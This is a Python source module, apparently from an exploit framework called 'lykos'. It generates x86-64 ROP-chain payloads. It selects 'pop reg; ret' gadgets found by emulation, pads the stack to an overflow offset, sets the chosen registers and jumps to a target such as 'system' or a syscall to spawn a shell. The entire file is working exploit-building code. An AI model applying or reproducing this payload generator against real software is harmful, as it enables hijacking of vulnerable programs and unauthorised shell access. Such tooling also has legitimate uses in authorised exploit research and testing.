"""ROP-chain SOLVER: turn the semantic gadget engine's effect inventory into a concrete stack
payload that sets a chosen register state and transfers control to a chosen address (a syscall site,
a function, a `system`). Where the pattern-matched builders assume a fixed gadget shape, this
composes from WHATEVER clean register-control gadgets the target actually has -- discovered by
`gadget_emu` (emulation, so the effects are real, not inferred).

Soundness: the solver only emits a chain; it never claims the chain WORKS. The caller detonates it
and confirms the effect (a spawned shell, a written marker, a reached breakpoint) with a negative
control, exactly as every other lykos exploit is confirmed. A chain built on a wrong gadget simply
fails to confirm.

Scope here: STACK-POPPING arches (x86-64), where a register setter is a `pop <reg>; ret` and the
chain is the classic contiguous layout -- each gadget's `ret` pops the next gadget's address off the
stack. Link-register arches (riscv/aarch64, where `ret`=`jr ra` and every link must restore ra) need
the ordered ra-threading variant; this module reports honestly (returns None) for an arch whose
setters are not stack-pop, rather than emit a layout that cannot chain.
"""
from __future__ import annotations

from . import gadget_emu


def _pop_setters(gadgets, reg):
    """Clean stack-pop setters for `reg`: term `ret`, reg loaded from the stack, smallest sp-adjust
    first (fewest incidental pops to pad around)."""
    out = [g for g in gadgets
           if g.get("term") == "ret" and str(g["effects"].get(reg, "")).startswith("stack@")]
    out.sort(key=lambda g: g["spadj"])
    return out


def solve_reg_chain(data: bytes, arch: str, *, sets: dict, final_va: int, offset: int,
                    word: int = 8, segments=None, max_insns: int = 4, pad: bytes = b"A"):
    """Synthesize a stack payload that sets each register in `sets` ({regname: value}) via clean
    stack-pop gadgets, then transfers to `final_va`.

    Returns {"payload": bytes, "chain": [(gadget_va, reg, value)], "final": final_va} or None when a
    requested register has no clean pop setter (the honest "cannot compose" answer) or the arch is
    not stack-popping / the engine is unavailable."""
    if not gadget_emu.available() or not gadget_emu.arch_supported(arch):
        return None
    if segments is None:
        # Derive the executable segments WITH their real vaddrs so gadget VAs are ABSOLUTE (a
        # file-offset VA would not match final_va / a loaded address). Without this a no-PIE target's
        # gadgets come back at file offsets and the chain jumps nowhere.
        from .rop import _loads
        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None
    want = tuple(sets)
    gadgets = gadget_emu.find_reg_control_gadgets(
        data, arch, want=want, segments=segments, max_insns=max_insns,
        max_results=400000, scan_cap=40_000_000)
    chosen = {}
    for reg in sets:
        setters = _pop_setters(gadgets, reg)
        if not setters:
            return None                                   # no clean setter -> cannot compose (honest)
        chosen[reg] = setters[0]

    def p(v):
        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")

    body = bytearray()
    chain = []
    for reg, val in sets.items():
        g = chosen[reg]
        n = int(g["effects"][reg].split("@")[1])          # stack offset the pop loads `reg` from
        span = g["spadj"]                                 # bytes this gadget pops before its `ret`
        region = bytearray((pad * ((span // len(pad)) + 1))[:span])
        region[n:n + word] = p(val)                       # the value the pop loads into `reg`
        body += p(g["va"]) + region                       # gadget addr, then its popped region
        chain.append((g["va"], reg, val))
    body += p(final_va)                                   # the final `ret` transfers here
    payload = pad * ((offset // len(pad)) + 1)
    payload = bytearray(payload[:offset]) + body
    return {"payload": bytes(payload), "chain": chain, "final": final_va}
